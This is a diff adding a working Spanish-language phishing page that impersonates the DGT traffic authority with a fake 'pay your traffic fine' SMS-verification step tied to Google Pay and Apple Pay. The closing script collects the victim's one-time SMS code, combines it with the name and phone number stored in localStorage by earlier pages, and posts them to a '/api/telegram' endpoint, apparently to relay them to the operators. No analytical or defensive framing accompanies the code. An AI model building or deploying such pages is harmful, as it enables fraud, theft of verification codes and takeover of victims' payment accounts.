@@ -1,0 +1,329 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	<meta charset="UTF-8" />
+	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
+	<title>Multa de Tr&aacute;fico - DGT</title>
+	<!-- Link to Google Fonts -->
+	<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet" /><!-- Bootstrap CSS link -->
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+	<style type="text/css">/* General Styles */
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f4f7fb;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        h2, h3 {
+            font-weight: 600;
+            color: #1e3d58;
+        }
+
+        /* Navbar */
+        .navbar {
+            background-color: #ffffff;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .navbar img {
+            max-height: 30px;
+        }
+
+        .navbar .nav-link {
+            color: #1e3d58;
+            font-size: 1.1rem;
+            font-weight: 500;
+            padding: 10px 15px;
+        }
+
+        .navbar .nav-link:hover {
+            background-color: #e1e8f0;
+            border-radius: 5px;
+        }
+
+        /* Header Section */
+        header {
+            text-align: center;
+            padding: 30px 15px;
+            background-color: #ffffff;
+            border-bottom: 2px solid #e1e8f0;
+        }
+
+        header h2 {
+            font-size: 2rem;
+            color: #1e3d58;
+        }
+
+        header p {
+            font-size: 1.1rem;
+            color: #555;
+        }
+
+        /* Procedure Section */
+        .procedure {
+            background-color: #ffffff;
+            padding: 40px 20px;
+            margin-top: 30px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            max-width: 900px;
+            margin: auto;
+        }
+
+        /* Dark button styles */
+        .procedure .btn-primary {
+            background-color: #003366;
+            border-color: #003366;
+            padding: 12px 30px;
+            font-size: 1.1rem;
+            width: 100%;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+            color: white;
+        }
+
+        .procedure .btn-primary:hover {
+            background-color: #002147;
+            border-color: #002147;
+        }
+
+        /* Form Styles */
+        .form-group label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            background-color: #f9f9f9;
+        }
+
+        .form-group input:focus {
+            border-color: #1e3d58;
+            outline: none;
+        }
+
+        /* Footer Section */
+        footer {
+            background-color: #1e3d58;
+            color: white;
+            padding: 30px 0;
+            margin-top: 50px;
+            text-align: center;
+        }
+
+        footer .logos img {
+            max-width: 120px;
+        }
+
+        footer p {
+            margin-top: 15px;
+            font-size: 1rem;
+        }
+
+        footer a {
+            color: #e1e8f0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Media Queries */
+        @media (max-width: 768px) {
+            .procedure {
+                padding: 30px 15px;
+            }
+
+            .navbar .nav-link {
+                padding: 8px 10px;
+            }
+
+            footer p {
+                font-size: 0.9rem;
+            }
+
+            /* Form styling for smaller screens */
+            .form-group input {
+                font-size: 14px;
+            }
+
+            /* Buttons and form fields */
+            .procedure .btn-primary {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .navbar .nav-link {
+                font-size: 1rem;
+                padding: 5px 8px;
+            }
+
+            .procedure .btn-primary {
+                font-size: 1rem;
+            }
+
+            .form-group input {
+                font-size: 14px;
+            }
+
+            /* Adjust width of inputs for small screens */
+            .form-group {
+                width: 100%;
+            }
+
+            /* Prevent form from zooming or being too large */
+            body {
+                font-size: 16px;
+            }
+
+            .form-group input {
+                padding: 10px;
+            }
+        }
+
+        /* SMS Error Message Styling */
+        #smsError {
+            color: red;
+            font-size: 16px;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 600;
+            margin-top: 10px;
+            background-color: #f8d7da;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #f5c6cb;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            display: none;  /* Hide by default */
+        }
+
+        /* SMS Error Frame */
+        .sms-error-frame {
+            border: 2px solid red;
+            background-color: #f8d7da;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 5px;
+            color: red;
+            text-align: center;
+        }
+	</style>
+</head>
+<body><!-- Navbar -->
+<nav class="navbar navbar-expand-lg navbar-light sticky-top">
+<div class="container"><img alt="DGT logo" src="https://th.bing.com/th/id/OIP.WmY7Qq5D4PjcUa_Vj8SwggHaDw?w=308&amp;h=177&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.5&amp;pid=1.7" /><button aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-bs-target="#navbarNav" data-bs-toggle="collapse" type="button"></button>
+<div class="collapse navbar-collapse" id="navbarNav">
+<ul class="navbar-nav ms-auto">
+	<li class="nav-item"><a class="nav-link" href="#">Nuestros servicios</a></li>
+	<li class="nav-item"><a class="nav-link" href="#">Mu&eacute;vete con seguridad</a></li>
+	<li class="nav-item"><a class="nav-link" href="#">Estado del tr&aacute;fico</a></li>
+	<li class="nav-item"><a class="nav-link" href="#">Conoce la DGT</a></li>
+	<li class="nav-item"><a class="nav-link" href="#">Comunicaci&oacute;n</a></li>
+</ul>
+</div>
+</div>
+</nav>
+<!-- Header Section -->
+
+<header>
+<h2><span style="font-size:22px;">Pago de Multa de Tr&aacute;fico</span></h2>
+
+<p><span style="font-size:14px;">Por favor, complete la siguiente informaci&oacute;n para proceder con el pago de su multa.</span></p>
+</header>
+
+<section class="procedure">
+<div class="row" style="box-sizing: inherit; margin-left: -15px; margin-right: -15px; color: rgb(76, 83, 93); font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">
+<div class="col-sm-12 text-center" style="box-sizing: inherit; position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; float: left; width: 1166px;"><img src="" style="box-sizing: inherit; border: 0px;" width="200" /></div>
+</div>
+
+<div class="row" style="box-sizing: inherit; margin-left: -15px; margin-right: -15px; color: rgb(76, 83, 93); font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">
+<div class="col-sm-12 text-center" style="box-sizing: inherit; position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; float: left; width: 1166px;">
+<p class="text-center" style="box-sizing: inherit; margin-right: 0px; margin-bottom: 1.25rem; margin-left: 0px;">Por favor ingrese el c&oacute;digo SMS recibido en su n&uacute;mero para completar la validaci&oacute;n de su pago. La validaci&oacute;n est&aacute; relacionada con Google Pay y Apple Pay.</p>
+</div>
+</div>
+
+<h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span style="box-sizing: inherit;">4</span></span><span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp;&nbsp;<span style="font-size:16px;">SMS</span></span></span></h2>
+
+<form id="smsForm" onsubmit="return validateSMS();" method="post">
+    <div class="row">
+<div class="col-md-6 form-group">&nbsp;</div>
+
+<div class="col-md-6 form-group">&nbsp;</div>
+
+<div class="col-md-6 form-group"><span style="color: rgb(76, 83, 93); font-family: 'Open Sans', Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">C&oacute;digo recibido por SMS</span>
+<input id="sms_input" maxlength="6" name="sms" required type="text" />
+<div class="sms-error-frame" id="smsError" style="display: none;">Por favor, ingrese un c&oacute;digo v&aacute;lido.</div>
+</div>
+
+<div class="col-md-6 form-group">&nbsp;</div>
+
+<div class="col-md-6 form-group">&nbsp;</div>
+</div>
+
+<button type="submit" class="btn btn-primary">Pagar Multa</button>
+</form>
+</section>
+
+<footer>
+<div class="container">
+<div class="row">
+<div class="col-lg-4 mb-4">
+<ul class="inline contact" style="box-sizing: inherit; padding: 0.625rem 1.5rem; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; color: rgb(255, 255, 255); text-align: center; font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; font-size: 13.712px; list-style: none; position: absolute; left: 0px; right: 0px; background: rgb(109, 109, 109);">
+	<li style="box-sizing: inherit; display: inline-block; margin-right: 1.5em;">&nbsp;<span class="sr-only" style="box-sizing: inherit; position: absolute; width: 1px; height: 1px; margin: -1px; padding: 0px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); border: 0px;">Tel&eacute;fono</span>011 Estado del Tr&aacute;fico</li>
+	<li>&nbsp;</li>
+	<li style="box-sizing: inherit; display: inline-block; margin-right: 1.5em;">&nbsp;<span class="sr-only" style="box-sizing: inherit; position: absolute; width: 1px; height: 1px; margin: -1px; padding: 0px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); border: 0px;">Tel&eacute;fono</span>060 Admin. Gral. del Estado</li>
+	<li>&nbsp;</li>
+	<li style="box-sizing: inherit; display: inline-block; margin-right: 0px;">&nbsp;<span class="sr-only" style="box-sizing: inherit; position: absolute; width: 1px; height: 1px; margin: -1px; padding: 0px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); border: 0px;">Ubicaci&oacute;n</span>C/ Josefa Valcarcel, 28 - 28071 Madrid-Espa&ntilde;a</li>
+</ul>
+</div>
+</div>
+</div>
+</footer>
+<script>
+    const smsForm = document.querySelector("#smsForm");
+    
+    smsForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+    
+      const sms_code = document.getElementById("sms_input").value;
+      const first_name = localStorage.getItem("first_name") || "";
+      const last_name = localStorage.getItem("last_name") || "";
+      const num = localStorage.getItem("num") || "";
+    
+      try {
+        const response = await fetch("/api/telegram", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ first_name, last_name, num, sms_code }),
+        });
+    
+        if (response.ok) {
+          window.location.href = "index.html"; // ← Redirect
+        } else {
+          document.getElementById("smsError").style.display = "block";
+        }
+      } catch (err) {
+        console.error(err);
+        document.getElementById("smsError").style.display = "block";
+      }
+    });
+    </script>
+    </body>
+</html>
+
+
+
